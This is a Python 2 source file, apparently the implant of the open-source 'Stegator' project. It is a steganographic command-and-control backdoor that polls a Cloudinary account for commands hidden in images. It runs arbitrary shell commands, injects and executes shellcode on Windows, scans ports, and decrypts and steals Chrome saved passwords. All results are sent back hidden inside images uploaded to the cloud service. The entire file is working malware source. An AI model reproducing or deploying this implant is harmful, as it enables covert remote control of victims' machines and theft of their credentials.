#!/usr/bin/env python
# -*- coding: utf-8 -*-

__license__ = """

Stegator

Author: https://twitter.com/1_mod_m/

Project site: https://github.com/1modm/stegator

The MIT License (MIT)

Copyright (c) 2016 MM

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""


#------------------------------------------------------------------------------
# Modules
#------------------------------------------------------------------------------

import os
import sys
import subprocess
import random
import tempfile
import string
import urllib2
from uuid import getnode as get_mac
import json
import threading
import base64
import platform
import shutil
import time
from thirdparty.color.termcolor import colored
import cloudinary
from cloudinary.uploader import upload
from cloudinary.api import delete_resources_by_tag, resources_by_tag
from PIL import Image
import socket
import unicodedata
import sqlite3
from shutil import copyfile
if (any(platform.win32_ver())):
    import win32crypt



#------------------------------------------------------------------------------
# Data
#------------------------------------------------------------------------------

JOBIDS = []
MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
PASSPHRASEENTRY = "P&$$W0rd"
TEMPIMPLANTIMG = "implantoutput.jpg"
TEMPSTEGOIMG = "stegatoroutput.jpg"
DEFAULT_TAG = "cacafuti"
HOSTNAME = socket.gethostname()


#------------------------------------------------------------------------------
# cloudinary authentication
#------------------------------------------------------------------------------

cloudinary.config( 
  cloud_name = "xxxxxxxxxxxx", 
  api_key = "xxxxxxxxxxxx", 
  api_secret = "xxxxxxxxxxxx" 
)


#------------------------------------------------------------------------------
# Class ImageHandle
#------------------------------------------------------------------------------

class ImageHandle():

    def get_img(self):
        try:
            imgur = "None"
            download_img = True

            print((colored('[+] Downloading image from Cloud Service...', 'white')))
            while download_img:
                
                # Remove not valid img downloaded 
                if (os.path.isfile(imgur)):
                    os.remove(imgur)

                imgur = ''.join(random.sample(string.letters+string.digits, 5)) + '.jpg'
                img = urllib2.urlopen("http://i.imgur.com/" + imgur).read()

                if len(img) != 503: # 'image not found' is 503 bytes
                    with open(os.path.join('./', imgur), "wb") as f:
                        f.write(img)
                    f.close()
                    
                    with Image.open(imgur) as im:
                        width, height = im.size

                    # Enough big to insert data
                    if (width > 400 and height > 400):
                        download_img = False
                    
            return imgur
        except:
            print((colored("[-] Get image error", "yellow")))
            if (os.path.isfile(imgur)):
                os.remove(imgur)


    def save(self, data, jobid):
        global PASSPHRASEENTRY
        global DEFAULT_TAG
        global TEMPIMPLANTIMG
        global HOSTNAME

        steghideOutput = True
        srcpathimage = self.get_img()

        try:
            shutil.copy2(srcpathimage, TEMPIMPLANTIMG)
            os.remove(srcpathimage)

            tmpdir = tempfile.mkdtemp()
            predictable_filename = "tempfile"
            # Ensure the file is read/write by the creator only
            saved_umask = os.umask(0077)
            pathimplantoutput = os.path.join(tmpdir, predictable_filename)

            try:
                with open(pathimplantoutput, "w") as tmp:
                    tmp.write(str(data))
                    tmp.close()

                    process = subprocess.Popen(['steghide', 'embed', '-p', PASSPHRASEENTRY, '-q', '-f', '-ef', pathimplantoutput, '-cf', TEMPIMPLANTIMG], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                    out, err = process.communicate()
                    if out:
                        print out
                        if ("steghide:" in out):
                            # Error steghide
                            steghideOutput = False
                    if err:
                        print err

            except IOError as e:
                print "IOError" + e
            else:
                os.remove(pathimplantoutput)
            finally:
                os.umask(saved_umask)
                os.rmdir(tmpdir)
        except:
            print((colored("[-] Error saving image", "yellow")))

        # Upload image downloaded in cloud service
        if (os.path.isfile(TEMPIMPLANTIMG) and steghideOutput):
            try:
                print((colored('[+] Uploaded image to Cloud Service', 'white')))
                jobidimplant = "implant_" + HOSTNAME + "_" + jobid

                response = upload(TEMPIMPLANTIMG,
                    tags = DEFAULT_TAG,
                    public_id = jobidimplant,
                )

            except:
                print((colored('[-] Cloud Service error', 'yellow')))
                return False
            finally:
                if (os.path.isfile(TEMPIMPLANTIMG)):
                    os.remove(TEMPIMPLANTIMG)
        else:
            return False

        return steghideOutput


    def load(self, urlimg):
        global PASSPHRASEENTRY
        global DEFAULT_TAG
        global TEMPSTEGOIMG

        extractedmessage = ""

        try:
            img = urllib2.urlopen(urlimg).read()
            if len(img) != 503: # 'image not found' is 503 bytes
                with open(os.path.join('./', TEMPSTEGOIMG), "wb") as f:
                    f.write(img)
        except:
            print((colored('[-] urllib2 error', 'yellow')))

        if (os.path.isfile(TEMPSTEGOIMG)):
            tmpdir = tempfile.mkdtemp()
            predictable_filename = 'tempfile'
            # Ensure the file is read/write by the creator only
            saved_umask = os.umask(0077)
            path = os.path.join(tmpdir, predictable_filename)
            pathtemp = tmpdir +"\wfile"

            try:
                with open(path, "wb") as tmp:
                    process = subprocess.Popen(['steghide', 'extract', '-p', PASSPHRASEENTRY, '-q', '-f', '-xf', path, '-sf', TEMPSTEGOIMG], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                    out, err = process.communicate()
                    if out:
                        print out
                    if err:
                        print err

                    shutil.copy2(path, pathtemp)
                    tmp.close()
                    
                file = open(pathtemp, 'r')
                extractedmessage = file.read()
                file.close()

            except IOError as e:
                print 'IOError' + str(e)
            else:
                if (os.path.isfile(path)):
                    os.remove(path)
                if (os.path.isfile(pathtemp)):
                    os.remove(pathtemp)
            finally:
                os.umask(saved_umask)
                if (os.path.isfile(path)):
                    os.remove(path)
                if (os.path.isfile(pathtemp)):
                    os.remove(pathtemp)
                if (os.path.isfile(TEMPSTEGOIMG)):
                    os.remove(TEMPSTEGOIMG)
                os.rmdir(tmpdir)

        return extractedmessage


#------------------------------------------------------------------------------
# Class CommandToExecute: Parse received Command
#------------------------------------------------------------------------------

class CommandToExecute:

    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except Exception as e:
            print ('Error decoding message: %s' % e)
            
    def is_for_me(self):
        global MAC_ADDRESS
        try:
            return MAC_ADDRESS == self.receiver or self.cmd == 'PING' and 'output' not in self.data
        except Exception as e:
            print ('Error: %s' % e)

    def retrieve_command(self):
        return self.jobid, self.cmd


#------------------------------------------------------------------------------
# Class CommandOutput: build Command to send
#------------------------------------------------------------------------------

class CommandOutput:

    def __init__(self, sender, receiver, output, jobid, cmd):
        self.sender = sender
        self.receiver = receiver
        self.output = output
        self.cmd = cmd
        self.jobid = jobid

    def remove_accents(self, input_str):
        nkfd_form = unicodedata.normalize('NFKD', unicode(input_str, encoding='utf-8', errors='ignore'))
        return u"".join([c for c in nkfd_form if not unicodedata.combining(c)])

    def build(self):
        if (any(platform.win32_ver())):
            stroutput = self.remove_accents(self.output)
        else:
            stroutput = self.output

        cmd = {'sender': self.sender,
                'receiver': self.receiver,
                'output': stroutput,
                'cmd': self.cmd,
                'jobid': self.jobid}
        return base64.b64encode(json.dumps(cmd))


#------------------------------------------------------------------------------
# Class ChromePasswords
#------------------------------------------------------------------------------

class ChromePasswords(threading.Thread):

    def __init__(self, jobid, cmd):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.command = cmd

        self.daemon = False
        self.start()


    def run(self):

        chrome_result = os.linesep

        try:
            path = os.getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
            pathcopy = os.getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\LoginDataCopy"
            copyfile(path, pathcopy)
            connectionSQLite = sqlite3.connect(pathcopy)
            cursor = connectionSQLite.cursor() 
            cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
            for raw in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(raw[2])[1]

                chrome_result = chrome_result + password + os.linesep
               
            connectionSQLite.close()
        except Exception, e:
            chrome_result = "No passwords in Chrome retrieved"
        

        # Send the results
        output_command = CommandOutput(MAC_ADDRESS, 'master', chrome_result, self.jobid, self.command)

        saveimg = ImageHandle()

        # Trying to save image until True
        saveimageOutput = False
        while not (saveimageOutput):
            saveimageOutput = saveimg.save(output_command.build(), self.jobid)



#------------------------------------------------------------------------------
# Class PortScanner
#------------------------------------------------------------------------------

class PortScanner(threading.Thread):

    def __init__(self, jobid, cmd, ip, ports):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.command = cmd
        self.ip = ip
        self.ports = ports

        self.daemon = False
        self.start()


    def run(self):
        scan_result = os.linesep

        # Ports format 21,22,23,80,443
        for port in self.ports.split(','):
            
            # for each port a connection using socket library 
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # returns 0: port opened 
                output = sock.connect_ex((self.ip, int(port) ))              
                if output == 0:
                    sock.send('Test \n')
                    banner = sock.recv(1024)
                    scan_result = scan_result + "[+] Port " + port + " is opened " + banner + os.linesep
                else:
                    scan_result = scan_result + "[-] Port " + port + " is closed or Host is not reachable" + os.linesep
                    
                sock.close()
        
            except Exception, e:
                pass

        # Send the results
        output_command = CommandOutput(MAC_ADDRESS, 'master', scan_result, self.jobid, self.command)

        saveimg = ImageHandle()

        # Trying to save image until True
        saveimageOutput = False
        while not (saveimageOutput):
            saveimageOutput = saveimg.save(output_command.build(), self.jobid)



#------------------------------------------------------------------------------
# Class ExecuteShellcode
#------------------------------------------------------------------------------

class ExecuteShellcode(threading.Thread):

    def __init__(self, jobid, shellc):
        threading.Thread.__init__(self)
        self.shellc = shellc
        self.jobid = jobid

        self.daemon = True
        self.start()

    def run(self):
        try:
            shellcode = bytearray(self.shellc)

            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40))

            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_int(ptr),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.pointer(ctypes.c_int(0)))

            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

        except Exception as e:
            print e
            pass



#------------------------------------------------------------------------------
# Class ExecuteCommand
#------------------------------------------------------------------------------

class ExecuteCommand(threading.Thread):

    def __init__(self, jobid, cmd):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.command = cmd

        self.daemon = False
        self.start()


    def run(self):
        output = None
        if (self.command == 'PING'):
            output = platform.platform()
        else:
            try:
                output = subprocess.check_output(self.command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
            except:
                print((colored('[-] Error executing the command' , 'yellow')))
                
        output_command = CommandOutput(MAC_ADDRESS, 'master', output, self.jobid, self.command)

        saveimg = ImageHandle()

        # Trying to save image until True
        saveimageOutput = False
        while not (saveimageOutput):
            saveimageOutput = saveimg.save(output_command.build(), self.jobid)


#------------------------------------------------------------------------------
# Class StdOutListener: listener to intercept messages
#------------------------------------------------------------------------------

class StdOutListener():

    def __init__(self):
        try:
            global JOBIDS
            global DEFAULT_TAG

            loadimg = ImageHandle()

            response = resources_by_tag(DEFAULT_TAG)
            get_response = response.get('resources', [])
            
            for key in sorted(get_response):
                img = urllib2.urlopen(key['url']).read()
                if len(img) != 503: # 'image not found' is 503 bytes
                   
                    public_id = key['public_id'] # JOBID

                    if (public_id.startswith("master_")):
                        
                        message = loadimg.load(key['url'])
                        cmdreceived = CommandToExecute(message)

                        if (cmdreceived.is_for_me()):
                            jobid, cmd = cmdreceived.retrieve_command()
                            if (jobid not in JOBIDS):
                                if (cmd.split(' ')[0] == 'shellcode'):
                                    sc = base64.b64decode(cmd.split(' ')[1]).decode('string-escape')
                                    print((colored("[+] shellcode jobid: %s, cmd to execute: %s" % (jobid, sc), "white")))
                                    JOBIDS.append(jobid)
                                    ExecuteShellcode(jobid, sc)
                                    
                                elif (cmd.split(' ')[0] == 'scanner'):
                                    sc = cmd.split(' ')[1].decode('string-escape')
                                    print((colored("[+] Port Scanner jobid: %s, %s" % (jobid, cmd), "white")))
                                    command = sc[5:]
                                    ip,ports = sc.split(':')
                                    JOBIDS.append(jobid)
                                    PortScanner(jobid, cmd, ip, ports)
                                    
                                elif (cmd.split(' ')[0] == 'chromepasswords'):
                                    print((colored("[+] Chrome jobid: %s, %s" % (jobid, cmd), "white")))
                                    JOBIDS.append(jobid)
                                    ChromePasswords(jobid, cmd)
                                    
                                else:
                                    print((colored("[+] jobid: %s, cmd to execute: %s" % (jobid, cmd), "white")))
                                    JOBIDS.append(jobid)
                                    ExecuteCommand(jobid, cmd)
                                    

        except Exception as e:
            print((colored('[-] Error decoding' + str(e) , 'yellow')))

        return None



#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

def main():
    try:
        while True:
            StdOutListener()
            time.sleep(5)

    except BaseException as e:
        print("Error Main", e)

if __name__ == '__main__':
    main()
